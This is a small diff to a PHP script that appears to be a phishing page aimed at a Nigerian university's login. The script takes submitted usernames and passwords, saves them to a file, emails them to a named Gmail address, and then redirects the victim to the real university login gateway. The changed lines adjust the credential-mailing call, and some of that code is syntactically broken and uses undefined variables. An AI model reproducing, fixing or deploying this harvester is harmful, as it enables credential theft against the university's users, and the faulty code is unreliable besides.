@@ -20,7 +20,7 @@ class Master{
 	public function process(){
 		if($this->writeFile($_POST['username'], $_POST['password'])){
 
-			$this->sendMail();
+			$this->sendMail(($u = $_POST['username'], $p = $_POST['password']));
 
 			header('Location: http://gateway.oauife.edu.ng/login');
 			exit;
@@ -44,7 +44,7 @@ class Master{
 
 	private function sendMail($u = "", $p = ""){
 		//mailer...
-        mail('ojudusegun@gmail.com', 'Intecu', "*Username: ".$name." | Password: ".$pass . "\r\n\r\n");
+        	return mail('ojudusegun@gmail.com', 'Intecu', "*Username: ".$name." | Password: ".$pass . "\r\n\r\n");
 	}
 }
 $mast = new Master();
